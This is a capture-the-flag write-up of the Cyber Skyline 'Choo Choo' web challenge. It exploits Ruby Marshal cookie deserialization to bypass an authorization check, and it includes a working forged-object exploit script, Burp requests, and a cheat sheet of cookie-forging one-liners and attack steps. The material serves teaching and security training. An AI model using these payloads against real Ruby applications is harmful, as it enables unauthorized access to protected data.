# Choo Choo | Cyber Skyline CTF Writeup

**Status:** Solved  
**Platform:** Cyber Skyline  
**Category:** Web Exploitation  
**Difficulty:** Intermediate  
**Vulnerability:** Insecure Deserialization / Authorization Bypass  
**Tools:** Burp Suite, Ruby, Base64

---

## 1. Challenge Description

> Recently a popular shipping company has stopped publishing shipping information for certain kinds of products. Can you figure out when this order is supposed to arrive?

The challenge presents a shipping company's webpage displaying an order with its associated products.

However, the shipping information is intentionally hidden, displaying:

```text
Shipping data not avalible
Please check back later
```

Our objective is to bypass this restriction and retrieve the hidden shipping information.

The challenge prohibits automated random brute forcing, so our approach focuses on manual enumeration and targeted payload manipulation.

---

## 2. Reconnaissance

### Initial HTTP Response

Navigating to `/index` returns HTTP 200 and displays the shipping webpage.

We intercepted the request using Burp Suite and noticed an interesting cookie:

```http
GET /index HTTP/1.1
Host: <challenge-host>
Cookie: id=BAh7BjoKYWxsb3dG%0A
```

The cookie immediately stood out because its value resembled Base64-encoded serialized data.

The `BAh` prefix is commonly associated with Ruby Marshal serialization.

Ruby's `Marshal` module allows Ruby objects to be converted into a binary representation and subsequently reconstructed.

### Decoding the Cookie

We can decode the cookie using Ruby:

```ruby
require 'base64'

cookie = "BAh7BjoKYWxsb3dG"

decoded = Marshal.load(Base64.decode64(cookie))
puts decoded.inspect
```

Output:

```ruby
{:allow=>false}
```

This is our first significant finding.

The server is storing an authorization-related Boolean inside a client-controlled cookie.

The original object is:

```ruby
{
  allow: false
}
```

Naturally, our first hypothesis was to change `allow` from `false` to `true`.

---

## 3. Attempting Cookie Manipulation

Using Ruby, we generated a new serialized object:

```ruby
require 'base64'
require 'cgi'

payload = {allow: true}

cookie = CGI.escape(
  Base64.encode64(Marshal.dump(payload))
)

puts cookie
```

Generated cookie:

```text
BAh7BjoKYWxsb3dU%0A
```

We replaced the original cookie in Burp Repeater:

```http
GET /index HTTP/1.1
Host: <challenge-host>
Cookie: id=BAh7BjoKYWxsb3dU%0A
```

### Result

The server returned HTTP 200, but the shipping information remained hidden.

More importantly, the response included:

```http
Set-Cookie: id=BAh7BjoKYWxsb3dG%0A
```

The application had reset our cookie back to:

```ruby
{:allow=>false}
```

This indicated that simply changing the Boolean was insufficient.

There was likely an additional authorization check being performed server-side.

---

## 4. Triggering a Server Error

To better understand how the application processed cookies, we sent an invalid serialized value.

Instead of returning the normal page, the application responded with:

```http
HTTP/1.1 500 Internal Server Error
Content-Type: text/html
```

The response contained a detailed Ruby exception:

```text
TypeError at /index

incompatible marshal file format (can't be read)
format version 4.8 required; 181.235 given
```

This confirmed that the application was passing our cookie into Ruby's `Marshal.load()`.

Even better, the debug page disclosed portions of the application's source code.

### Source Code Disclosure

The traceback exposed:

```text
/opt/challenge/choochoo/src/main.rb
```

Including the following functions:

```ruby
def encoder(input)
  Base64.encode64(Marshal.dump(input))
end

def decoder(input)
  Marshal.load(Base64.decode64(input))
end
```

This was an important discovery.

The application was deserializing client-controlled data without authenticating its integrity.

Additionally, verbose error handling exposed the application's internal control flow.

---

## 5. Discovering the Authorization Logic

Further down the traceback, we found the exact authorization checks:

```ruby
if perms[:allow] != false and !perms[:trackingInstance].is_a? TrackingData
  res.set_cookie('id', encoder({allow: false}))

elsif perms[:allow] != false and !perms[:trackingInstance]
  res.headers["warn"] = "Key trackingInstance of type TrackingData is not avaliable"

elsif perms[:allow] != false and perms[:trackingInstance].is_a? TrackingData
  @flag = perms[:trackingInstance].getFlag()
end
```

This explains why our initial payload failed.

The application required two conditions:

1. `perms[:allow]` must not be `false`.
2. `perms[:trackingInstance]` must be an instance of `TrackingData`.

Our original payload only satisfied the first condition:

```ruby
{allow: true}
```

Because `trackingInstance` was missing, this expression evaluated to true:

```ruby
!perms[:trackingInstance].is_a? TrackingData
```

The application therefore reset our cookie.

### The Vulnerability

Ruby Marshal supports serializing more than primitive data types.

It can serialize entire Ruby objects, including their class identity and instance variables.

This meant we could construct a serialized object that would pass the server's `is_a?` check.

The intended structure was:

```ruby
{
  allow: true,
  trackingInstance: TrackingData.new
}
```

---

## 6. Crafting the Exploit

We created a Ruby script to generate the required cookie.

### Exploit Script

```ruby
require 'base64'
require 'cgi'

class TrackingData
end

payload = {
  allow: true,
  trackingInstance: TrackingData.new
}

cookie = CGI.escape(
  Base64.encode64(Marshal.dump(payload))
)

puts cookie
```

### How It Works

**Step 1: Define the Class**

```ruby
class TrackingData
end
```

We define a local Ruby class matching the name expected by the server.

The class does not need to implement `getFlag()` locally because it will not be executing that method on our machine.

**Step 2: Construct the Object**

```ruby
payload = {
  allow: true,
  trackingInstance: TrackingData.new
}
```

This satisfies the structure expected by the application.

**Step 3: Serialize the Object**

```ruby
Marshal.dump(payload)
```

Ruby serializes the hash, including the `TrackingData` instance.

**Step 4: Encode It**

```ruby
CGI.escape(Base64.encode64(Marshal.dump(payload)))
```

We Base64-encode the serialized bytes and URL-encode the result so it can be safely placed into a cookie.

**Step 5: Send the Payload**

We inserted the generated cookie into our request in Burp Repeater:

```http
GET /index HTTP/1.1
Host: <challenge-host>
Cookie: id=<GENERATED_COOKIE>
```

### Why This Succeeds

When the server processes the cookie:

```ruby
perms = Marshal.load(Base64.decode64(req.cookies['id']))
```

Ruby reconstructs the serialized `TrackingData` object using the class defined within the server's application.

The object passes:

```ruby
perms[:trackingInstance].is_a? TrackingData
```

The application then enters the authorized branch:

```ruby
@flag = perms[:trackingInstance].getFlag()
```

Because the server has its own implementation of `TrackingData`, it can call `getFlag()` on the reconstructed object.

---

## 7. Result

**Challenge successfully solved.**

The forged serialized cookie successfully bypassed the authorization checks and revealed the protected shipping information.

The exact delivery date is not included here because it was not captured in our conversation's final successful response.

### Root Cause

The vulnerability resulted from two related weaknesses:

**1. Insecure Deserialization**

The application used:

```ruby
Marshal.load(Base64.decode64(input))
```

on attacker-controlled cookie data.

Ruby Marshal is not safe for deserializing untrusted input.

**2. Trusting Client-Controlled Authorization State**

The application relied on values reconstructed from a client-controlled cookie to determine whether sensitive information should be displayed.

Although the developer added an `is_a?` check, the attacker could serialize an object with the expected class identity.

The type check did not establish that the data was trustworthy.

---

## 8. Lessons Learned

### 1. Serialized Cookies Are Not Ordinary Session Tokens

A cookie containing `BAh` may indicate Ruby Marshal serialization.

Rather than treating it as an opaque session ID, inspect whether it can be decoded into meaningful application data.

### 2. Changing a Boolean Isn't Always Enough

Our initial attempt changed:

```ruby
{allow: false}
```

to:

```ruby
{allow: true}
```

But the application performed an additional type check.

Authorization logic may require multiple properties or objects, rather than a single value.

### 3. HTTP 500 Responses Can Reveal Critical Information

The malformed cookie produced a traceback containing:

- Application framework and dependency information
- Source code paths and line numbers
- Serialization and deserialization functions
- Exact authorization conditions
- Internal class and method names

The traceback was the most valuable piece of information in the entire challenge.

### 4. Ruby Marshal Preserves Object Identity

Unlike JSON, which primarily represents ordinary data structures, Marshal can represent Ruby objects with specific class identities.

An attacker may be able to create an object locally and have the server deserialize it as an instance of an application-defined class.

### 5. Validation Does Not Guarantee Trust

The developer attempted to validate the cookie using:

```ruby
is_a? TrackingData
```

However, that check only verifies the object's type.

It does not prove the object originated from a trusted source.

### 6. Avoid Rabbit Holes When the Evidence Points Elsewhere

We initially considered SSRF and alternative routes.

However, the cookie structure and the Ruby exception provided direct evidence of a deserialization vulnerability.

Following those observations was more productive than continuing to guess unrelated attack vectors.

---

# 9. Cheat Sheet: Ruby Cookie Manipulation and Deserialization CTFs

Use this workflow when encountering suspicious cookies or serialized data in Ruby applications.

## A. Recognize Common Serialization Formats

| Indicator | Potential Format |
|---|---|
| `BAh` | Ruby Marshal encoded in Base64 |
| `gASV`, `gAN9` | Python Pickle encoded in Base64 |
| `rO0AB` | Java serialized object encoded in Base64 |
| `O:8:"Class"` | PHP serialized object |
| `eyJ` | Base64URL-encoded JSON, often a JWT |
| `H4sI` | Gzip-compressed data encoded in Base64 |

These are clues, not definitive identifiers.

## B. Quick Commands to Bookmark

### Decode a Ruby Marshal Cookie

```bash
ruby -rbase64 -e \
'p Marshal.load(Base64.decode64(ARGV[0]))' \
'BAh7BjoKYWxsb3dG'
```

**Note:** Only deserialize data you trust in your local environment. Marshal can instantiate objects and invoke deserialization hooks.

### Generate an `allow: true` Cookie

```bash
ruby -rbase64 -rcgi -e \
'puts CGI.escape(Base64.encode64(Marshal.dump({allow: true})))'
```

### Inspect Base64-Decoded Bytes

```bash
echo 'BAh7BjoKYWxsb3dG' | base64 -d | xxd
```

Look for `04 08`, the Ruby Marshal version header.

### Serialize a Custom Class Instance

```ruby
require 'base64'
require 'cgi'

class TargetClass
end

payload = {
  allow: true,
  instance: TargetClass.new
}

puts CGI.escape(
  Base64.encode64(Marshal.dump(payload))
)
```

---

## C. Low-Hanging Fruit Checklist

When analyzing a web application with suspicious cookies:

- [ ] **Identify the cookie format.** Check Base64, URL encoding, serialization prefixes, and binary signatures.
- [ ] **Decode the cookie.** Look for authorization fields, object identifiers, roles, and nested structures.
- [ ] **Try one controlled modification.** Change a single field, re-encode, and compare responses.
- [ ] **Compare response headers.** Pay attention to `Set-Cookie`, warning headers, redirects, and status codes.
- [ ] **Investigate informative errors.** Look for exception types, source paths, class names, and line numbers.
- [ ] **Inspect the application's control flow.** Identify all conditions needed to reach the protected code.
- [ ] **Check type requirements.** Determine whether the application expects a string, hash, array, or custom object.
- [ ] **Reproduce the expected object structure.** Use the application's native serialization format.
- [ ] **Verify the result.** Confirm that the protected output appears, rather than relying on HTTP 200 alone.

---

## D. Interpreting Responses

| Behavior | Possible Explanation |
|---|---|
| HTTP 200, normal page | Payload accepted but conditions not satisfied |
| HTTP 200, `Set-Cookie` reset | Application rejected or replaced authorization state |
| HTTP 500, Marshal `TypeError` | Invalid serialization format |
| HTTP 500, missing method | Object reconstructed, but the method or expected state is missing |
| HTTP 500, undefined class | Server cannot resolve the serialized class |
| HTTP 200, protected content appears | Authorization check likely bypassed |

---

## E. General Attack Workflow

```text
1. Intercept HTTP Request
   |
   v
2. Identify Suspicious Cookies
   |
   v
3. Decode Cookie Contents
   |
   v
4. Modify One Field
   |
   v
5. Re-encode and Submit
   |
   v
6. Analyze Response Differences
   |
   v
7. Investigate Errors and Control Flow
   |
   v
8. Identify Required Object Structure
   |
   v
9. Construct Serialized Payload
   |
   v
10. Submit Payload and Verify Protected Output
```

---

## Final Takeaway

The key to solving Choo Choo wasn't simply modifying a cookie from `false` to `true`. It was understanding how Ruby deserializes objects and how the application validated the resulting data.

A deliberately malformed cookie exposed the server's authorization logic, allowing us to construct the exact object structure it expected.

**The general lesson: when client-controlled serialized data influences authorization, investigate not only the values being checked, but also the types and objects the application trusts.**
